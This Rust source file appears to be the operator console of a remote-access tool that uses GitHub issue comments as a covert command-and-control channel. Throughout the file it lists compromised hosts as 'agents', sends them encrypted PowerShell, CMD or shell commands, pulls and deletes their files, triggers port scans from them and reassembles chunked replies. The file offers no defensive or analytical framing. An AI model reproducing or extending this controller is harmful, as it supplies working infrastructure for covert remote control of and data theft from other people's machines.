use base64::Engine as _;
use serde::{Deserialize, Serialize};
use std::sync::{Arc, Mutex};

#[derive(Deserialize)]
struct FileEntry {
    name: String,
    is_dir: bool,
    size: i64,
}

#[derive(Deserialize)]
struct FileUploadPayload {
    name: String,
    data: String,
}

fn format_size(size: i64) -> String {
    if size < 1024 {
        format!("{} B", size)
    } else if size < 1024 * 1024 {
        format!("{:.1} KB", size as f64 / 1024.0)
    } else if size < 1024 * 1024 * 1024 {
        format!("{:.1} MB", size as f64 / (1024.0 * 1024.0))
    } else {
        format!("{:.1} GB", size as f64 / (1024.0 * 1024.0 * 1024.0))
    }
}

#[derive(Clone, Serialize, Deserialize)]
pub struct Agent {
    pub id: String,
    pub hostname: String,
    pub os: String,
    pub username: String,
    pub last_seen: String,
    pub repo: String,
}

#[derive(Clone)]
pub struct Message {
    pub timestamp: String,
    pub content: String,
    pub is_command: bool,
}

#[derive(Clone)]
pub struct FileItem {
    pub name: String,
    pub is_dir: bool,
    pub size: i64,
}

#[derive(PartialEq)]
pub enum Tab {
    Terminal,
    Files,
    Scan,
    Settings,
    Logs,
}

pub struct App {
    pub github_token: String,
    pub github_repos: Vec<String>,
    pub repo_input: String,
    pub password: String,
    pub agents: Vec<Agent>,
    pub selected_agent: Option<String>,
    pub current_tab: Tab,
    pub messages: Vec<Message>,
    pub command_input: String,
    pub file_path: String,
    pub file_list: Vec<FileItem>,
    pub scan_host: String,
    pub scan_ports: String,
    pub db: Arc<Mutex<rusqlite::Connection>>,
    pub last_poll: std::time::Instant,
    pub chunk_buffer: std::collections::HashMap<String, Vec<String>>,
    pub chunk_part_map: std::collections::HashMap<String, String>,
    pub last_comment_time: Option<String>,
    pub pending_commands: std::collections::HashSet<String>,
    pub error_message: Option<String>,
    pub use_cmd: bool,
    pub use_interactive: bool,
    pub agent_cmd_prefs: std::collections::HashMap<String, bool>,
    pub confirm_action: Option<(String, String)>,
    pub logs: Vec<String>,
    pub poll_interval: u64,
    pub enable_logging: bool,
}

fn get_agent_os(agents: &[Agent], selected: Option<&String>) -> String {
    selected
        .and_then(|id| agents.iter().find(|a| &a.id == id))
        .map(|a| a.os.to_lowercase())
        .unwrap_or_default()
}

fn is_agent_windows(agents: &[Agent], selected: Option<&String>) -> bool {
    get_agent_os(agents, selected).contains("windows")
}

fn default_file_path_for_agent(agents: &[Agent], selected: Option<&String>) -> String {
    if is_agent_windows(agents, selected) {
        "DRIVES".to_string()
    } else {
        "/".to_string()
    }
}

fn quote_powershell_literal_path(path: &str) -> String {
    path.replace('\'', "''")
}

fn quote_posix_single(path: &str) -> String {
    path.replace('\'', "'\"'\"'")
}

impl App {
    pub fn new(_cc: &eframe::CreationContext<'_>) -> Self {
        let db = crate::db::init_db().expect("Failed to init database");
        let db_arc = Arc::new(Mutex::new(db));

        let mut github_token = String::new();
        let mut github_repos = Vec::new();
        let mut password = String::new();
        let mut poll_interval = 5u64;

        if let Ok(conn) = db_arc.lock() {
            if let Ok(Some(token)) = crate::db::get_config(&conn, "github_token") {
                github_token = token;
            }
            if let Ok(Some(repos)) = crate::db::get_config(&conn, "github_repos") {
                github_repos = repos
                    .split(',')
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty())
                    .collect();
            }
            if let Ok(Some(pwd)) = crate::db::get_config(&conn, "password") {
                password = pwd;
            }
            if let Ok(Some(interval)) = crate::db::get_config(&conn, "poll_interval") {
                poll_interval = interval.parse().unwrap_or(5);
            }
        }

        Self {
            github_token,
            github_repos,
            repo_input: String::new(),
            password,
            agents: Vec::new(),
            selected_agent: None,
            current_tab: Tab::Settings,
            messages: Vec::new(),
            command_input: String::new(),
            file_path: "/".to_string(),
            file_list: Vec::new(),
            scan_host: String::new(),
            scan_ports: String::new(),
            db: db_arc,
            last_poll: std::time::Instant::now(),
            chunk_buffer: std::collections::HashMap::new(),
            chunk_part_map: std::collections::HashMap::new(),
            last_comment_time: None,
            pending_commands: std::collections::HashSet::new(),
            error_message: None,
            use_cmd: false,
            use_interactive: false,
            agent_cmd_prefs: std::collections::HashMap::new(),
            confirm_action: None,
            logs: Vec::new(),
            poll_interval,
            enable_logging: false,
        }
    }
}

impl eframe::App for App {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        if self.last_poll.elapsed().as_secs() >= self.poll_interval {
            self.poll_responses();
            self.last_poll = std::time::Instant::now();
            ctx.request_repaint();
        }

        if let Some(err) = &self.error_message.clone() {
            egui::Window::new("Error")
                .collapsible(false)
                .resizable(false)
                .anchor(egui::Align2::CENTER_CENTER, [0.0, 0.0])
                .show(ctx, |ui| {
                    ui.colored_label(egui::Color32::RED, err);
                    if ui.button("OK").clicked() {
                        self.error_message = None;
                    }
                });
        }

        let mut confirmed = false;
        let mut cancelled = false;
        if let Some((title, message)) = &self.confirm_action.clone() {
            egui::Window::new(title)
                .collapsible(false)
                .resizable(false)
                .anchor(egui::Align2::CENTER_CENTER, [0.0, 0.0])
                .show(ctx, |ui| {
                    ui.label(message);
                    ui.horizontal(|ui| {
                        if ui.button("Confirm").clicked() {
                            confirmed = true;
                        }
                        if ui.button("Cancel").clicked() {
                            cancelled = true;
                        }
                    });
                });
        }

        if confirmed {
            if let Some((title, _)) = self.confirm_action.clone() {
                if title == "Clear History" {
                    self.clear_history();
                } else if title.starts_with("Delete File") {
                    if let Some(file_name) = title.strip_prefix("Delete File: ") {
                        self.delete_file_confirmed(file_name);
                    }
                }
            }
            self.confirm_action = None;
        }
        if cancelled {
            self.confirm_action = None;
        }

        egui::TopBottomPanel::top("top_panel").show(ctx, |ui| {
            ui.horizontal(|ui| {
                ui.selectable_value(&mut self.current_tab, Tab::Terminal, "Terminal");
                ui.selectable_value(&mut self.current_tab, Tab::Files, "Files");
                ui.selectable_value(&mut self.current_tab, Tab::Scan, "Scan");
                ui.selectable_value(&mut self.current_tab, Tab::Settings, "Settings");
                ui.selectable_value(&mut self.current_tab, Tab::Logs, "Logs");

                ui.separator();
                if ui.button("Refresh Agents").clicked() {
                    self.refresh_agents();
                }
            });
        });

        let mut new_selection = None;
        egui::SidePanel::left("agents_panel")
            .min_width(250.0)
            .show(ctx, |ui| {
                ui.heading("Agents");
                egui::ScrollArea::vertical().show(ui, |ui| {
                    use std::collections::BTreeMap;
                    let mut grouped: BTreeMap<String, Vec<&Agent>> = BTreeMap::new();
                    for agent in &self.agents {
                        grouped
                            .entry(agent.repo.clone())
                            .or_insert_with(Vec::new)
                            .push(agent);
                    }

                    if grouped.is_empty() {
                        ui.label(
                            egui::RichText::new(
                                "No agents found. Please configure repositories in Settings.",
                            )
                            .color(egui::Color32::GRAY)
                            .size(12.0),
                        );
                    }

                    for (repo, agents) in grouped.iter() {
                        egui::CollapsingHeader::new(egui::RichText::new(repo).size(13.0).strong())
                            .default_open(true)
                            .show(ui, |ui| {
                                for agent in agents {
                                    let is_selected =
                                        self.selected_agent.as_ref() == Some(&agent.id);

                                    let response = ui.group(|ui| {
                                        if is_selected {
                                            ui.visuals_mut().widgets.noninteractive.weak_bg_fill =
                                                egui::Color32::from_rgb(60, 120, 180);
                                            ui.visuals_mut().override_text_color =
                                                Some(egui::Color32::WHITE);
                                        }
                                        ui.set_min_width(220.0);
                                        ui.vertical(|ui| {
                                            ui.label(
                                                egui::RichText::new(&agent.hostname)
                                                    .size(14.0)
                                                    .strong(),
                                            );
                                            ui.label(
                                                egui::RichText::new(format!("OS: {}", agent.os))
                                                    .size(12.0)
                                                    .color(egui::Color32::GRAY),
                                            );
                                            ui.label(
                                                egui::RichText::new(format!(
                                                    "User: {}",
                                                    agent.username
                                                ))
                                                .size(12.0)
                                                .color(egui::Color32::GRAY),
                                            );
                                            ui.label(
                                                egui::RichText::new(format!("#{}", agent.id))
                                                    .size(11.0)
                                                    .color(egui::Color32::DARK_GRAY),
                                            );
                                        });
                                    });

                                    if response.response.interact(egui::Sense::click()).clicked() {
                                        new_selection = Some(agent.id.clone());
                                    }

                                    ui.add_space(5.0);
                                }
                            });
                    }
                });
            });

        if let Some(id) = new_selection {
            self.selected_agent = Some(id.clone());
            self.use_cmd = self.agent_cmd_prefs.get(&id).copied().unwrap_or(false);
            self.load_history();
            self.load_file_state();
        }

        egui::CentralPanel::default().show(ctx, |ui| match self.current_tab {
            Tab::Terminal => self.show_terminal(ui),
            Tab::Files => self.show_files(ui),
            Tab::Scan => self.show_scan(ui),
            Tab::Settings => self.show_settings(ui),
            Tab::Logs => self.show_logs(ui),
        });
    }
}

impl App {
    fn show_terminal(&mut self, ui: &mut egui::Ui) {
        ui.horizontal(|ui| {
            ui.heading("Terminal");

            if let Some(agent_id) = &self.selected_agent {
                if let Some(agent) = self.agents.iter().find(|a| &a.id == agent_id) {
                    if agent.os.to_lowercase().contains("windows") {
                        ui.separator();
                        if ui.selectable_label(!self.use_cmd, "PowerShell").clicked() {
                            self.use_cmd = false;
                            if let Some(id) = &self.selected_agent {
                                self.agent_cmd_prefs.insert(id.clone(), false);
                            }
                        }
                        if ui.selectable_label(self.use_cmd, "CMD").clicked() {
                            self.use_cmd = true;
                            if let Some(id) = &self.selected_agent {
                                self.agent_cmd_prefs.insert(id.clone(), true);
                            }
                        }
                    }
                }
            }

            ui.separator();
            if ui
                .selectable_label(!self.use_interactive, "Non-Interactive")
                .clicked()
            {
                self.use_interactive = false;
            }
            if ui
                .selectable_label(self.use_interactive, "Interactive")
                .clicked()
            {
                self.use_interactive = true;
            }
        });

        if !self.pending_commands.is_empty() {
            ui.colored_label(
                egui::Color32::from_rgb(255, 200, 0),
                format!("⏳ {} command(s) executing...", self.pending_commands.len()),
            );
        }

        egui::ScrollArea::vertical()
            .max_height(500.0)
            .stick_to_bottom(true)
            .show(ui, |ui| {
                for msg in &self.messages {
                    if msg.is_command {
                        ui.separator();
                        ui.label(
                            egui::RichText::new(format!("> {}", msg.content))
                                .color(egui::Color32::from_rgb(180, 0, 0))
                                .size(16.0)
                                .family(egui::FontFamily::Monospace),
                        );
                    } else {
                        ui.label(
                            egui::RichText::new(&msg.content)
                                .color(egui::Color32::from_rgb(0, 150, 0))
                                .size(16.0)
                                .family(egui::FontFamily::Monospace),
                        );
                        ui.separator();
                    }
                }
            });

        ui.separator();
        ui.horizontal(|ui| {
            ui.label(">");
            let response = ui.add(
                egui::TextEdit::multiline(&mut self.command_input)
                    .desired_width(ui.available_width() - 80.0)
                    .desired_rows(2)
                    .font(egui::TextStyle::Monospace),
            );
            if ui.button(egui::RichText::new("Send").size(16.0)).clicked()
                || (response.lost_focus() && ui.input(|i| i.key_pressed(egui::Key::Enter)))
            {
                self.send_command();
            }
        });
    }

    fn show_files(&mut self, ui: &mut egui::Ui) {
        ui.heading("File Manager");

        ui.horizontal(|ui| {
            ui.label("Path:");
            ui.add(egui::TextEdit::singleline(&mut self.file_path).desired_width(600.0));
            if ui.button("⬆ Up").clicked() {
                self.go_parent_dir();
            }
            if ui.button("🔄 Refresh").clicked() {
                self.refresh_files();
            }
        });

        ui.separator();

        egui::ScrollArea::vertical().show(ui, |ui| {
            egui::Grid::new("file_grid").striped(true).show(ui, |ui| {
                ui.label("Name");
                ui.label("Type");
                ui.label("Size");
                ui.label("Actions");
                ui.end_row();

                let file_list = self.file_list.clone();
                for file in &file_list {
                    let icon = if file.is_dir { "📁" } else { "📄" };
                    if ui.button(format!("{} {}", icon, file.name)).clicked() {
                        if file.is_dir {
                            self.enter_directory(&file.name);
                        }
                    }
                    ui.label(if file.is_dir { "DIR" } else { "FILE" });
                    ui.label(format_size(file.size));

                    ui.horizontal(|ui| {
                        if !file.is_dir && ui.button("⬇ Download").clicked() {
                            self.download_file(&file.name);
                        }
                        if ui.button("Delete").clicked() {
                            self.confirm_action = Some((
                                format!("Delete File: {}", file.name),
                                format!("Are you sure you want to delete '{}'?", file.name),
                            ));
                        }
                    });
                    ui.end_row();
                }
            });
        });

        ui.separator();
        if ui.button("📤 Upload File").clicked() {}
    }

    fn show_scan(&mut self, ui: &mut egui::Ui) {
        ui.heading("Port Scanner");

        ui.horizontal(|ui| {
            ui.label("Host:");
            ui.text_edit_singleline(&mut self.scan_host);
        });

        ui.horizontal(|ui| {
            ui.label("Ports:");
            ui.text_edit_singleline(&mut self.scan_ports);
        });

        if ui.button("Scan").clicked() {
            self.send_command_direct(&format!("scan {} {}", self.scan_host, self.scan_ports));
            self.current_tab = Tab::Terminal;
        }

        ui.separator();
        if ui.button("Uninstall Agent").clicked() {
            self.send_command_direct("uninstall");
        }
        if ui.button("Clear History").clicked() {
            self.confirm_action = Some((
                "Clear History".to_string(),
                "Are you sure you want to clear all command history?".to_string(),
            ));
        }
    }

    fn show_settings(&mut self, ui: &mut egui::Ui) {
        ui.heading("Settings");

        ui.horizontal(|ui| {
            ui.label("GitHub Token:");
            ui.text_edit_singleline(&mut self.github_token);
        });

        ui.horizontal(|ui| {
            ui.label("Add Repo:");
            ui.text_edit_singleline(&mut self.repo_input);
            ui.label(
                egui::RichText::new("(format: owner/repo)")
                    .size(11.0)
                    .color(egui::Color32::GRAY),
            );
            if ui.button("Add").clicked() && !self.repo_input.is_empty() {
                if self.repo_input.contains('/') && !self.github_repos.contains(&self.repo_input) {
                    self.github_repos.push(self.repo_input.clone());
                    self.repo_input.clear();
                } else if !self.repo_input.contains('/') {
                    self.error_message = Some("Invalid format. Use: owner/repo".to_string());
                }
            }
        });

        ui.label("Repositories:");
        egui::ScrollArea::vertical()
            .max_height(150.0)
            .show(ui, |ui| {
                if self.github_repos.is_empty() {
                    ui.label(
                        egui::RichText::new("No repositories added yet")
                            .color(egui::Color32::GRAY)
                            .size(12.0),
                    );
                }
                let mut to_remove = None;
                for (i, repo) in self.github_repos.iter().enumerate() {
                    ui.horizontal(|ui| {
                        ui.label(egui::RichText::new(repo).size(13.0));
                        if ui.button("✖").clicked() {
                            to_remove = Some(i);
                        }
                    });
                }
                if let Some(i) = to_remove {
                    self.github_repos.remove(i);
                }
            });

        ui.horizontal(|ui| {
            ui.label("Password:");
            ui.add(egui::TextEdit::singleline(&mut self.password).password(true));
        });

        ui.horizontal(|ui| {
            ui.label("Poll Interval (seconds):");
            let mut interval_str = self.poll_interval.to_string();
            if ui.text_edit_singleline(&mut interval_str).changed() {
                if let Ok(val) = interval_str.parse::<u64>() {
                    if val >= 1 && val <= 60 {
                        self.poll_interval = val;
                    }
                }
            }
        });

        if ui.button("Save & Connect").clicked() {
            self.init_github();
        }
    }

    fn init_github(&mut self) {
        if self.github_token.is_empty() || self.github_repos.is_empty() {
            self.error_message = Some("Please fill in Token and at least one Repo".to_string());
            return;
        }

        if self.password.is_empty() {
            self.error_message = Some("Please set encryption password".to_string());
            return;
        }

        if let Ok(conn) = self.db.lock() {
            let _ = crate::db::save_config(&conn, "github_token", &self.github_token);
            let _ = crate::db::save_config(&conn, "github_repos", &self.github_repos.join(","));
            let _ = crate::db::save_config(&conn, "password", &self.password);
            let _ = crate::db::save_config(&conn, "poll_interval", &self.poll_interval.to_string());
        }

        self.refresh_agents();
    }

    fn show_logs(&mut self, ui: &mut egui::Ui) {
        ui.heading("Debug Logs");

        ui.horizontal(|ui| {
            ui.checkbox(&mut self.enable_logging, "Enable Logging");
            if ui.button("Clear Logs").clicked() {
                self.logs.clear();
            }
            if ui.button("Reset Comment Cache").clicked() {
                if let (Some(agent_id), Ok(conn)) = (&self.selected_agent, self.db.lock()) {
                    let _ = conn.execute(
                        "DELETE FROM processed_comments WHERE agent_id = ?1",
                        [agent_id],
                    );
                    self.logs.push(format!(
                        "[{}] 已清空comment缓存",
                        chrono::Local::now().format("%H:%M:%S")
                    ));
                }
            }
            if ui.button("Clear Terminal History").clicked() {
                if let (Some(agent_id), Ok(conn)) = (&self.selected_agent, self.db.lock()) {
                    let _ = conn.execute("DELETE FROM messages WHERE agent_id = ?1", [agent_id]);
                    self.messages.clear();
                    self.logs.push(format!(
                        "[{}] 已清空Terminal历史",
                        chrono::Local::now().format("%H:%M:%S")
                    ));
                }
            }
        });

        egui::ScrollArea::vertical().show(ui, |ui| {
            for log in &self.logs {
                ui.label(egui::RichText::new(log).size(12.0));
            }
        });
    }

    fn refresh_agents(&mut self) {
        if self.github_token.is_empty() || self.github_repos.is_empty() || self.password.is_empty()
        {
            return;
        }

        let mut all_agents = Vec::new();
        for repo in &self.github_repos {
            let client = crate::github::GitHubClient::new(self.github_token.clone(), repo.clone());
            if let Ok(agents) = client.get_agents() {
                all_agents.extend(agents);
            }
        }
        self.agents = all_agents;
    }

    fn send_command(&mut self) {
        let mut cmd = self.command_input.clone();
        self.command_input.clear();

        if self.use_cmd {
            if let Some(agent_id) = &self.selected_agent {
                if let Some(agent) = self.agents.iter().find(|a| &a.id == agent_id) {
                    if agent.os.to_lowercase().contains("windows") {
                        cmd = format!("cmd:{}", cmd);
                    }
                }
            }
        }

        if self.use_interactive {
            cmd = format!("interactive:{}", cmd);
        }

        self.send_command_direct(&cmd);
    }

    fn send_command_direct(&mut self, cmd: &str) {
        if self.selected_agent.is_none() {
            self.error_message = Some("Please select an agent first".to_string());
            return;
        }

        if self.github_token.is_empty() || self.password.is_empty() {
            self.error_message = Some("Please configure GitHub settings first".to_string());
            return;
        }

        if let Some(agent_id) = &self.selected_agent {
            let agent = self.agents.iter().find(|a| &a.id == agent_id);
            if agent.is_none() {
                self.error_message = Some("Agent not found".to_string());
                return;
            }

            let repo = agent.unwrap().repo.clone();
            let client = crate::github::GitHubClient::new(self.github_token.clone(), repo);
            let encrypted = crate::crypto::encrypt(cmd, &self.password);
            if encrypted.is_empty() {
                self.error_message = Some("Encryption failed".to_string());
                return;
            }

            if let Err(e) = client.send_command(agent_id, &encrypted) {
                self.error_message = Some(format!("Send failed: {}", e));
                return;
            }

            self.messages.push(Message {
                timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
                content: cmd.to_string(),
                is_command: true,
            });

            self.pending_commands.insert(cmd.to_string());

            if let Ok(conn) = self.db.lock() {
                let _ = crate::db::save_message(&conn, agent_id, cmd, true);
            }
        }
    }

    fn load_history(&mut self) {
        self.messages.clear();
        if let Some(agent_id) = &self.selected_agent {
            if let Ok(conn) = self.db.lock() {
                if let Ok(msgs) = crate::db::get_messages(&conn, agent_id) {
                    for (ts, content, is_cmd) in msgs {
                        self.messages.push(Message {
                            timestamp: ts,
                            content,
                            is_command: is_cmd,
                        });
                    }
                }
            }
        }
        self.load_files_from_cache();
    }

    fn load_file_state(&mut self) {
        if let Some(agent_id) = &self.selected_agent {
            if let Ok(conn) = self.db.lock() {
                let key = format!("{}_file_path", agent_id);
                if let Ok(Some(path)) = crate::db::get_config(&conn, &key) {
                    self.file_path = path;
                } else {
                    self.file_path =
                        default_file_path_for_agent(&self.agents, self.selected_agent.as_ref());
                }
            }
        }
        self.load_files_from_cache();
    }

    fn load_files_from_cache(&mut self) {
        self.file_list.clear();
        if let Some(agent_id) = &self.selected_agent {
            if let Ok(conn) = self.db.lock() {
                if let Ok(files) = crate::db::get_file_list(&conn, agent_id, &self.file_path) {
                    for (name, is_dir, size) in files {
                        self.file_list.push(FileItem { name, is_dir, size });
                    }
                }
            }
        }
    }

    fn refresh_files(&mut self) {
        self.send_command_direct(&format!("ls {}", self.file_path));
    }

    fn go_parent_dir(&mut self) {
        if is_agent_windows(&self.agents, self.selected_agent.as_ref()) {
            if self.file_path.ends_with(":\\") {
                self.file_path = "DRIVES".to_string();
            } else if let Some(pos) = self.file_path.rfind('\\') {
                self.file_path = self.file_path[..pos.max(3)].to_string();
            }
        } else {
            if self.file_path == "/" {
                return;
            }
            if let Some(pos) = self.file_path.rfind('/') {
                self.file_path = self.file_path[..pos.max(1)].to_string();
            }
        }
        self.load_files_from_cache();
    }

    fn enter_directory(&mut self, name: &str) {
        if self.file_path == "DRIVES" {
            self.file_path = name.to_string();
        } else {
            let sep = if is_agent_windows(&self.agents, self.selected_agent.as_ref()) {
                "\\"
            } else {
                "/"
            };
            if !self.file_path.ends_with(sep) {
                self.file_path.push_str(sep);
            }
            self.file_path.push_str(name);
        }

        if let (Some(agent_id), Ok(conn)) = (&self.selected_agent, self.db.lock()) {
            let key = format!("{}_file_path", agent_id);
            let _ = crate::db::save_config(&conn, &key, &self.file_path);
        }

        self.load_files_from_cache();

        if self.file_list.is_empty() {
            self.refresh_files();
        }
    }

    fn download_file(&mut self, name: &str) {
        let sep = if is_agent_windows(&self.agents, self.selected_agent.as_ref()) {
            "\\"
        } else {
            "/"
        };
        let path = format!(
            "{}{}{}",
            self.file_path,
            if self.file_path.ends_with(sep) {
                ""
            } else {
                sep
            },
            name
        );
        self.send_command_direct(&format!("upload {}", path));
    }

    fn delete_file_confirmed(&mut self, name: &str) {
        let is_win = is_agent_windows(&self.agents, self.selected_agent.as_ref());
        let sep = if is_win { "\\" } else { "/" };
        let path = format!(
            "{}{}{}",
            self.file_path,
            if self.file_path.ends_with(sep) {
                ""
            } else {
                sep
            },
            name
        );
        let cmd = if is_win {
            format!(
                "Remove-Item -LiteralPath '{}' -Force",
                quote_powershell_literal_path(&path)
            )
        } else {
            format!("rm -f -- '{}'", quote_posix_single(&path))
        };
        self.send_command_direct(&cmd);
    }

    fn poll_responses(&mut self) {
        if let Some(agent_id) = &self.selected_agent.clone() {
            let agent = self.agents.iter().find(|a| &a.id == agent_id);
            if agent.is_none() {
                return;
            }

            let repo = agent.unwrap().repo.clone();
            let client = crate::github::GitHubClient::new(self.github_token.clone(), repo);

            if let Ok(comments) = client.get_responses(agent_id, self.last_comment_time.as_deref())
            {
                if !comments.is_empty() && self.enable_logging {
                    self.logs.push(format!(
                        "[{}] 获取到 {} 条新回复",
                        chrono::Local::now().format("%H:%M:%S"),
                        comments.len()
                    ));
                }

                for comment in &comments {
                    if self.enable_logging {
                        self.logs.push(format!(
                            "[{}] 处理comment #{}: {}",
                            chrono::Local::now().format("%H:%M:%S"),
                            comment.id,
                            &comment.body[..50.min(comment.body.len())]
                        ));
                    }

                    if let Ok(conn) = self.db.lock() {
                        if crate::db::is_comment_processed(&conn, agent_id, comment.id as i64)
                            .unwrap_or(false)
                        {
                            if self.enable_logging {
                                self.logs.push(format!("  -> 已处理,跳过"));
                            }
                            continue;
                        }
                    }

                    let body = if comment.body.starts_with("[RESP]") {
                        &comment.body[6..]
                    } else {
                        &comment.body
                    };

                    if let Ok(decrypted) = crate::crypto::decrypt(body, &self.password) {
                        if self.enable_logging {
                            self.logs.push(format!(
                                "  -> 解密成功: {}",
                                &decrypted[..50.min(decrypted.len())]
                            ));
                        }
                        self.process_response(&decrypted);

                        if let Ok(conn) = self.db.lock() {
                            let _ = crate::db::save_message(&conn, agent_id, &decrypted, false);
                            let _ = crate::db::mark_comment_processed(
                                &conn,
                                agent_id,
                                comment.id as i64,
                            );
                        }
                    } else {
                        let display_body = if body.len() > 100 {
                            format!("{}...(truncated)", &body[..100])
                        } else {
                            body.to_string()
                        };
                        self.messages.push(Message {
                            timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
                            content: format!("[Decrypt Failed] {}", display_body),
                            is_command: false,
                        });

                        if let Ok(conn) = self.db.lock() {
                            let _ = crate::db::mark_comment_processed(
                                &conn,
                                agent_id,
                                comment.id as i64,
                            );
                        }
                    }
                }

                if let Some(last) = comments.last() {
                    self.last_comment_time = Some(last.updated_at.clone());
                }
            }
        }
    }

    fn process_response(&mut self, response: &str) {
        if response.starts_with("[Part ") {
            self.handle_chunk(response);
        } else if response.starts_with("[FILES_JSON]") {
            self.parse_file_list(response);
            self.pending_commands.clear();
        } else if response.starts_with("[FILE_UPLOAD_JSON]") {
            self.pending_commands.clear();
            self.handle_uploaded_file(response);
        } else {
            self.pending_commands.clear();
            self.messages.push(Message {
                timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
                content: response.to_string(),
                is_command: false,
            });
        }
    }

    fn handle_chunk(&mut self, chunk: &str) {
        if let Some(end) = chunk.find(']') {
            let header = &chunk[6..end];
            let parts: Vec<&str> = header.split('/').collect();
            if parts.len() == 3 {
                let response_id = parts[0].to_string();
                let current: usize = parts[1].parse().unwrap_or(0);
                let total: usize = parts[2].parse().unwrap_or(0);
                let content = &chunk[end + 2..];

                if current > 0 && current <= total {
                    let key = format!("chunk_{}_{}", response_id, total);
                    self.chunk_part_map.insert(response_id.clone(), key.clone());
                    let chunks = self
                        .chunk_buffer
                        .entry(key.clone())
                        .or_insert_with(|| vec![String::new(); total]);
                    chunks[current - 1] = content.to_string();

                    if chunks.iter().all(|c| !c.is_empty()) {
                        let full = chunks.join("");
                        self.chunk_buffer.remove(&key);
                        self.chunk_part_map.remove(&response_id);
                        self.process_response(&full);
                    }
                }
            }
        }
    }

    fn parse_file_list(&mut self, data: &str) {
        self.file_list.clear();

        let Some(payload) = data.strip_prefix("[FILES_JSON]\n") else {
            return;
        };

        if let Ok(entries) = serde_json::from_str::<Vec<FileEntry>>(payload) {
            if let (Some(agent_id), Ok(conn)) = (&self.selected_agent, self.db.lock()) {
                let _ = crate::db::clear_file_list(&conn, agent_id, &self.file_path);
                for entry in &entries {
                    let _ = crate::db::save_file_list(
                        &conn,
                        agent_id,
                        &self.file_path,
                        &entry.name,
                        entry.is_dir,
                        entry.size,
                    );
                }
            }

            for entry in entries {
                self.file_list.push(FileItem {
                    name: entry.name,
                    is_dir: entry.is_dir,
                    size: entry.size,
                });
            }
        }
    }

    fn handle_uploaded_file(&mut self, response: &str) {
        let Some(payload) = response.strip_prefix("[FILE_UPLOAD_JSON]\n") else {
            return;
        };

        let file = match serde_json::from_str::<FileUploadPayload>(payload) {
            Ok(file) => file,
            Err(e) => {
                self.error_message = Some(format!("Failed to parse file payload: {}", e));
                return;
            }
        };

        let data = if file.data.contains("[FILE_START]") {
            let mut full_data = Vec::new();
            for line in file.data.lines() {
                if line == "[FILE_START]" || line == "[FILE_END]" || line.starts_with("[CHUNK_") {
                    continue;
                }
                match base64::engine::general_purpose::STANDARD.decode(line) {
                    Ok(chunk) => full_data.extend_from_slice(&chunk),
                    Err(e) => {
                        self.error_message = Some(format!("Failed to decode file chunk: {}", e));
                        return;
                    }
                }
            }
            full_data
        } else {
            match base64::engine::general_purpose::STANDARD.decode(file.data.as_bytes()) {
                Ok(data) => data,
                Err(e) => {
                    self.error_message = Some(format!("Failed to decode file: {}", e));
                    return;
                }
            }
        };

        let save_dir = std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|p| p.to_path_buf()))
            .or_else(|| std::env::current_dir().ok())
            .unwrap_or_else(|| std::path::PathBuf::from("."));
        let save_path = save_dir.join(&file.name);

        match std::fs::write(&save_path, data) {
            Ok(_) => self.messages.push(Message {
                timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
                content: format!("[Downloaded] {}", save_path.display()),
                is_command: false,
            }),
            Err(e) => {
                self.error_message = Some(format!("Failed to save file: {}", e));
            }
        }
    }

    fn clear_history(&mut self) {
        if let Some(agent_id) = &self.selected_agent {
            let agent = self.agents.iter().find(|a| &a.id == agent_id);
            if let Some(agent) = agent {
                let repo = agent.repo.clone();
                let client = crate::github::GitHubClient::new(self.github_token.clone(), repo);
                let _ = client.clear_history(agent_id);

                self.messages.clear();
                self.pending_commands.clear();
                self.chunk_buffer.clear();
                self.chunk_part_map.clear();
                self.last_comment_time = None;

                if let Ok(conn) = self.db.lock() {
                    let _ = conn.execute("DELETE FROM messages WHERE agent_id = ?1", [agent_id]);
                    let _ = conn.execute(
                        "DELETE FROM processed_comments WHERE agent_id = ?1",
                        [agent_id],
                    );
                    let _ = conn.execute("DELETE FROM file_list WHERE agent_id = ?1", [agent_id]);
                }

                self.file_list.clear();
            }
        }
    }
}
